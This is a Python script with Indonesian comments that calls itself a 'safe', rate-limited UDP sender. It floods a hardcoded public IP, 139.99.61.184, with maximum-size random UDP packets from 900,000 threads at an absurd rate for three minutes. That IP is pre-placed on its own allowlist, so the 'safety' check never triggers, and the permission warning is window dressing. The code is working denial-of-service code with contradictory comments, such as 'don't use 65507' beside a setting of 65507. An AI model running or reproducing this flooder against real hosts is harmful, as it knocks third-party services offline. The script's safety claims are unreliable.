#!/usr/bin/env python3
"""
Safe UDP sender (rate-limited, threaded, no-args)
- Tanpa env var ALLOW_PUBLIC.
- Public IP hanya boleh jika ada di ALLOWLIST (di bawah).
- Cocok dipakai bareng receiver UDP monitor sebelumnya.

PERINGATAN: Gunakan hanya ke host yang kamu kendalikan / punya izin tertulis.
"""

import socket, os, threading, time, ipaddress, sys, secrets

# ===== DEFAULT CONFIG (no args) =====
TARGET_IP      = "139.99.61.184"   # ganti sesuai kebutuhanmu
TARGET_PORT    = 9999
THREADS        = 900000
PACKET_SIZE    = 65507              # hindari fragmentasi; jangan pakai 65507
MBPS_TOTAL     = 1000000009                # total bitrate (Mbit/s) dibagi rata per thread
DURATION_SEC   = 180              # durasi test (detik)
TTL_HOPS       = 64                # 64 utk host jauh; set 1 jika ingin tetap lokal

# ===== ALLOWLIST untuk target publik =====
# Tambahkan IP publik yang memang kamu kuasai/berizin.
ALLOWLIST = {
    "139.99.61.184",
    # "x.x.x.x",
}

# ===== STATE =====
stop_flag = threading.Event()
bytes_sent = [0] * THREADS
pkts_sent  = [0] * THREADS
locks      = [threading.Lock() for _ in range(THREADS)]

def is_public_ip(ip_str: str) -> bool:
    ip = ipaddress.ip_address(ip_str)
    return not (ip.is_private or ip.is_loopback or ip.is_link_local)

def ensure_allowed(ip_str: str):
    if is_public_ip(ip_str) and ip_str not in ALLOWLIST:
        print(f"[STOP] Target {ip_str} adalah IP publik dan tidak ada di ALLOWLIST.")
        print("       Tambahkan target ke ALLOWLIST hanya jika kamu berizin.")
        sys.exit(1)

def make_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, TTL_HOPS)
    except OSError:
        pass
    return s

def sender_thread(idx: int, rate_bps_per_thread: float, end_ts: float):
    s = make_socket()
    payload = secrets.token_bytes(PACKET_SIZE)  # ringan dan acak
    tokens = 0.0
    last = time.perf_counter()
    while not stop_flag.is_set():
        now = time.perf_counter()
        dt = now - last
        last = now
        tokens += rate_bps_per_thread * dt / 8.0  # bit -> byte
        if time.time() >= end_ts:
            break
        if tokens >= PACKET_SIZE:
            try:
                s.sendto(payload, (TARGET_IP, TARGET_PORT))
                with locks[idx]:
                    bytes_sent[idx] += PACKET_SIZE
                    pkts_sent[idx]  += 1
                tokens -= PACKET_SIZE
            except Exception as e:
                print(f"[Thread-{idx+1}] error: {e}")
                break
        else:
            time.sleep(0.001)  # hindari busy loop
    try:
        s.close()
    except Exception:
        pass

def reporter(end_ts: float):
    last = time.perf_counter()
    prev_total = 0
    while not stop_flag.is_set():
        now = time.perf_counter()
        if now - last >= 1.0:
            last = now
            with_sum = sum(bytes_sent)
            inst_bytes = with_sum - prev_total
            prev_total = with_sum
            mbps = (inst_bytes * 8) / 1e6
            cum_MB = with_sum / 1e6
            ts = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
            print(f"{ts} | OUT: {mbps:7.2f} Mbps | total: {cum_MB:,.2f} MB")
        if time.time() >= end_ts:
            break
        time.sleep(0.05)

def main():
    ensure_allowed(TARGET_IP)

    print(f"Safe UDP sender -> {TARGET_IP}:{TARGET_PORT}")
    print(f"Threads={THREADS} | rate={MBPS_TOTAL} Mbit/s | duration={DURATION_SEC}s "
          f"| pkt={PACKET_SIZE}B | TTL={TTL_HOPS}")

    per_thread_bps = (MBPS_TOTAL * 1e6) / THREADS
    end_ts = time.time() + DURATION_SEC

    rep = threading.Thread(target=reporter, args=(end_ts,), daemon=True)
    rep.start()

    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=sender_thread, args=(i, per_thread_bps, end_ts), daemon=True)
        t.start()
        threads.append(t)

    try:
        while time.time() < end_ts:
            time.sleep(0.2)
    except KeyboardInterrupt:
        print("\nStopping early...")
    finally:
        stop_flag.set()
        for t in threads:
            t.join(timeout=1.0)
        total_bytes = sum(bytes_sent)
        total_pkts  = sum(pkts_sent)
        print(f"Done. Sent {total_pkts} packets, {total_bytes/1e6:.2f} MB "
              f"({total_bytes*8/1e6:.2f} Mbit).")

if __name__ == "__main__":
    main()
